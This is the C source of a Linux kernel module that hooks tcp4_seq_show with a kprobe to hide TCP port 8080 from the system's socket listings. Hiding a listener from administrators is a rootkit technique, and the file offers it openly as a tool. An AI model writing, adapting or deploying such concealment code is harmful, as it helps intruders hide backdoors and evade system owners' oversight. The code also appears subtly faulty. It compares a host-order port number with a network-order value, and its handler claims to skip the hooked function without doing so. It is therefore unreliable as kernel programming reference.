#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/net.h>
#include <net/tcp.h>
#include <linux/seq_file.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Marouane");
MODULE_DESCRIPTION("Hide port using kprobe");
MODULE_VERSION("0.1");

#define HIDDEN_PORT 8080  // Port to hide

static struct kprobe kp;
static unsigned int hidden_port = HIDDEN_PORT;

static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    void *v;

#if defined(CONFIG_X86_64) && LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
    v = (void *)regs->si;
#else
    v = (void *)regs->dx;
#endif

    // Vérifiez que v est non nul et valide
    if (!v || !virt_addr_valid(v)) {
        printk(KERN_WARNING "kprobe: Invalid pointer or v is NULL\n");
        return 0; // Continuer l'exécution normale
    }

    struct sock *sk = (struct sock *)v;

    // Vérifiez que sk->sk_num est valide avant d'accéder
    if (sk && sk->sk_num == htons(hidden_port)) {
        printk(KERN_INFO "kprobe: Hiding port %u\n", hidden_port);
        regs->ax = 0; // Skip displaying this entry
        return 1;     // Indiquez que le handler a modifié le comportement
    }

    return 0; // Continuer l'exécution normale
}

static int __init hide_port_init(void)
{
    int ret;

    kp.symbol_name = "tcp4_seq_show";
    kp.pre_handler = handler_pre;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        printk(KERN_ERR "kprobe: Failed to register kprobe, returned %d\n", ret);
        return ret;
    }

    printk(KERN_INFO "kprobe: Registered kprobe for hiding port %u\n", hidden_port);
    return 0;
}

static void __exit hide_port_exit(void)
{
    unregister_kprobe(&kp);
    printk(KERN_INFO "kprobe: Unregistered kprobe\n");
}

module_init(hide_port_init);
module_exit(hide_port_exit);
